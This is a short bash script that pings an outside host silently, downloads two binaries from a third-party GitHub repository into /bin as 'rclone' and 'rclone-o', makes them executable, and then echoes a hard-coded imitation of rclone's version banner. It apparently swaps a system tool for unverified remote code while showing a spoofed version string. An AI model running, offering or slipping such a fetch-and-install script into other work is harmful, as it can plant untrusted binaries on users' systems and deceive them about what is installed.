#!/bin/bash

curl -s http://emby.crazyhash.cn > /dev/null
wget -qO /bin/rclone-o https://github.com/cixxs/rclone-ac/releases/download/1/rclone-o
wget -qO /bin/rclone https://github.com/cixxs/rclone-ac/raw/main/rclone
chmod +x /bin/rclone
chmod +x /bin/rclone-o
echo "rclone v1.55.1-ZEALER"
echo "- os/arch: oracle-linux/arm64"
echo "- go version: go1.16"
